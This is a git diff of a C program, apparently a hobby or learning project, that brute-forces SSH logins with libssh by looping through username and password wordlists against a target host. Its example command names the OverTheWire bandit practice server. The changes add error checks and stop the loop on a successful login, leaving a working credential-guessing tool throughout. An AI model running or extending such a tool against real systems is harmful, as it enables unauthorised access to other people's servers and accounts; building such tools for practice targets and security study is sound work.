@@ -6,8 +6,9 @@
 
 //Example command: ./thing ssh bandit.labs.overthewire.org -u bandit0 -P passwords.txt -s 2220
 
-void sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh);
+int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh);
 void sshOutput(int attemptStatus, ssh_session my_ssh);
+
 
 //Global variables
 char *service;
@@ -26,16 +27,15 @@ int main(int argc, char *argv[]) {
     int opt;
     usr = malloc(256*sizeof(char));
     pass = malloc(256*sizeof(char));
-    printf("Initial Pass address:%p", &pass);
+    // printf("Initial Pass address:%p", &pass);
     
-    
-
     /*Expected input:
         name service destination [-s PORT] [-u USERNAMES] [-p PASSWORD] {more stuff later}
         bandit.labs.overthewire.org
     */
     
     /*Command line parsing*/
+    optind = 1;
     //printf("optind: %i, arg: %s\n", optind, argv[optind]);
     while (optind < argc) {
         opt = getopt(argc, argv, ":s:u:U:p:P:");
@@ -46,16 +46,12 @@ int main(int argc, char *argv[]) {
                 break;
             case 'u':
                 usr = optarg;
-                //strncpy(usr, optarg, 256);
-                // usr[255] = '\0';
                 break;
             case 'U':
                 usrFilename = optarg;
                 break;
             case 'p':
                 pass = optarg;
-                // strncpy(pass, optarg, 256);
-                // pass[255] = '\0';
                 break;
             case 'P':
                 passFilename = optarg;
@@ -69,14 +65,16 @@ int main(int argc, char *argv[]) {
                 exit(1);
                 break;
             case -1:
-                //either destination or service
-
+                //A non-option argument: must be either destination or service
                 if (!strncmp(argv[optind], "ssh", 4)) {
                     service = "ssh";
                 } else {
                     destination = argv[optind];
                 }
                 optind++;
+                break;
+            default:
+                exit(1);
                 break;
 
         }
@@ -85,7 +83,8 @@ int main(int argc, char *argv[]) {
     //Error checking
 
 
-    printf("Passed command line checking\n");
+    // printf("Passed command line checking\n");
+
     /*===Services===*/
     int success = 0;
     if (!strcmp(service, "ssh")) {
@@ -95,17 +94,32 @@ int main(int argc, char *argv[]) {
         if (usrFilename != NULL && passFilename != NULL) {
             usrFile = fopen(usrFilename, "r");
             passFile = fopen(passFilename, "r");
+            
+            if (usrFile == NULL && passFile == NULL) {
+                printf("File not found: %s\nFile not found: %s",usrFilename, passFilename);
+                exit(1);
+            } else if (usrFile == NULL) {
+                printf("File not found: %s\n",usrFilename);
+                exit(1);
+            } else if (passFile == NULL) {
+                printf("File not found: %s\n",passFilename);
+                exit(1);
+            }
+
             while (fgets(usr, 256, usrFile) != NULL) {
                 if(usr[strlen(usr)-1] == '\n') {
                     printf("newline detected");
                     usr[strlen(usr)-1] = '\0';
                 }                
                 while (fgets(pass, 256, passFile) != NULL) {
+                    // Replace new line with null to mark end of password
                     if(pass[strlen(pass)-1] == '\n') {
                         pass[strlen(pass)-1] = '\0';
                     }
                     ssh_session my_ssh = ssh_new();
-                    sshAttempt(destination, usr, pass, my_ssh);   
+                    if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
+                        break;
+                    }   
                 }
                 rewind(passFile);
             }
@@ -113,6 +127,10 @@ int main(int argc, char *argv[]) {
             fclose(passFile);
         } else if (usrFilename != NULL) {
             usrFile = fopen(usrFilename, "r");
+            if (usrFile == NULL) {
+                printf("File not found: %s\n",usrFilename);
+                exit(1);
+            }
             while (fgets(usr, 256, usrFile) != NULL) {
                 if(usr[strlen(usr)-1] == '\n') {
                     usr[strlen(usr)-1] = '\0';
@@ -122,15 +140,19 @@ int main(int argc, char *argv[]) {
             }
             fclose(usrFile);
         } else if (passFilename != NULL) {
-            printf("A\n");
             passFile = fopen(passFilename, "r");
-            printf("B\n");
+            if (passFile == NULL) {
+                printf("File not found: %s\n",passFilename);
+                exit(1);
+            }
             while (fgets(pass, 256, passFile) != NULL) {
                 if(pass[strlen(pass)-1] == '\n') {
                     pass[strlen(pass)-1] = '\0';
-                }            // Replace new line with null to mark end of password
+                }            
                 ssh_session my_ssh = ssh_new();
-                sshAttempt(destination, usr, pass, my_ssh);   
+                if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
+                    break;
+                }  
             }
             fclose(passFile);
         } else {
@@ -147,9 +169,14 @@ int main(int argc, char *argv[]) {
     return 0;
 }
 
-void sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh) {
-    
-
+/*
+Input:
+    - destination: IP address or hostname to attack
+    - username and password for SSH login
+    - my_ssh handler
+Output: int attemptStatus. Tells whether the auth is sucessful.
+*/
+int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh) {
     //Configure the options before making an SSH connection
     ssh_options_set(my_ssh, SSH_OPTIONS_HOST, destination);
     ssh_options_set(my_ssh, SSH_OPTIONS_PORT, &port);
@@ -164,11 +191,11 @@ void sshAttempt(char* destination, char* username, char* password, ssh_session m
         exit(-1);
     }
 
-    printf("Successful connection\n");
-    
-    printf("User:%s, Pass:%s\n", usr, pass);
-    sshOutput(ssh_userauth_password(my_ssh, NULL, pass), my_ssh);
-    return;
+    //printf("Successful connection\n");
+    //printf("User:%s, Pass:%s\n", usr, pass);
+    int attemptStatus = ssh_userauth_password(my_ssh, NULL, pass);
+    sshOutput(attemptStatus, my_ssh);
+    return attemptStatus;
 }
 
 void sshOutput(int attemptStatus, ssh_session my_ssh) {
@@ -176,7 +203,7 @@ void sshOutput(int attemptStatus, ssh_session my_ssh) {
         printf("Authentication successful. || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
         ssh_disconnect(my_ssh);
     } else if(attemptStatus == SSH_AUTH_DENIED) {
-        printf("Authentication failure. Password:%sis not valid for user: %s\n", pass, usr);
+        printf("Authentication failure. Password:%s is not valid for user: %s\n", pass, usr);
         ssh_disconnect(my_ssh);
     } else {
         fprintf(stderr, "Error authenticating with password: %s\n",
@@ -185,7 +212,6 @@ void sshOutput(int attemptStatus, ssh_session my_ssh) {
     }
     
     ssh_free(my_ssh); //Do we really wanna free and allocate new ssh_session every time?
-    
 
     return;
 }
